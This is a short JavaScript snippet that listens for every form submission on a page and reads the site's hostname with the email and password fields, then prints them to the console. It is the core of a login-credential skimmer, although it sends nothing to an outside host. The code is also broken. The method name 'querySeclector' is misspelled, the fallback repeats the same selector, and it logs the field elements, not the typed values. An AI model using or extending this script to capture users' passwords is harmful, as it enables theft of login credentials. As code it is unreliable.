document.addEventListener("submit",function(event){
    const form = event.target;
    const domain = window.location.hostname;
    const username = form.querySeclector("input[type='email']") || form.querySeclector("input[type='email']");
    const password = form.querySelector("input[type='password']");
    console.log("domain: "+domain+"    username: "+username+"    password: "+password);
})